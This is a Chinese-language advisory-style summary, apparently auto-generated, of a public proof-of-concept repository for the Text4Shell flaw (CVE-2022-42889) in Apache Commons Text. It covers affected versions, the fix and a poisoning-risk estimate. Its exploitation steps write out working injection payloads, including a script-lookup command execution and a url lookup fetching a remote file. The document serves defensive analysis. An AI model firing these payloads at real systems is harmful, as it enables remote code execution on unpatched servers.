## CVE-2022-42889 - Apache Commons Text RCE (Text4Shell)

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** <= 1.9

**利用条件:** 应用程序必须使用受影响版本的Apache Commons Text，并且允许用户控制的输入传递给StringSubstitutor进行插值。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889 (Text4Shell) 是 Apache Commons Text 库中的一个漏洞，允许攻击者通过操纵传递给 `StringSubstitutor` 的输入来执行任意代码。漏洞存在于1.5到1.9版本中。升级到1.10.0及以上版本可以解决此问题，因为该版本默认禁用了有问题的插值器，或者禁用受影响的lookup，例如`script`, `dns`, `url`。

**有效性：**
根据漏洞描述和搜索结果，提供的POC代码（尤其是 `src/main/java/org/dontpanic/text4shell/controller/ExploitMeController.java` 文件）旨在演示此漏洞。`ExploitMeController` 中的 `/lookup` 端点接收用户提供的 `value`，并将其直接传递给 `StringSubstitutor.replace()` 方法，而没有进行任何清理或验证。这允许攻击者注入恶意表达式，例如`${script:javascript:Runtime.getRuntime().exec("command")}`，从而导致远程代码执行。

**投毒风险：**
提供的代码主要是漏洞利用的演示，旨在重现和展示 CVE-2022-42889。虽然代码本身并没有明显的恶意或后门性质，但存在一些小的风险。由于整个仓库的目的就是为了演示漏洞，如果有人下载并部署了这个应用，并将其暴露在公网上，那么它会立即成为攻击目标。因此，可以认为存在很低的投毒风险 (约5%)，因为作者可能故意提供一个容易被利用的环境，但不是传统意义上的“投毒”，而是漏洞演示的副产品。

**利用方式：**
1.  **目标系统：** 目标系统需要运行使用了 Apache Commons Text 1.5 到 1.9 版本的应用程序。
2.  **输入注入：** 攻击者需要找到一个应用程序接口，该接口允许用户提供输入，然后应用程序使用受影响的 Apache Commons Text 版本对该输入进行插值处理。例如，在提供的 POC 中，`/lookup` 端点就是一个这样的接口。
3.  **构造恶意Payload：**  攻击者需要构造一个包含恶意表达式的Payload，该表达式利用了 `script`, `dns`, 或 `url` lookup 来执行代码或进行其他恶意操作。示例Payload：
    *   `${script:javascript:Runtime.getRuntime().exec('touch /tmp/pwned')}` - 执行任意命令 (例如，创建一个文件)。
    *   `${dns:address|example.com}` - 执行 DNS 查询。
    *   `${url:UTF-8:https://example.com/evil.txt}` - 从远程 URL 加载内容。
4.  **发送Payload：**  攻击者将构造的Payload发送到目标应用程序的易受攻击的接口。
5.  **代码执行：**  如果应用程序使用 `StringSubstitutor` 处理Payload，它将执行Payload中的恶意表达式，从而导致远程代码执行或其它恶意行为。


**项目地址:** [hotblac/text4shell](https://github.com/hotblac/text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)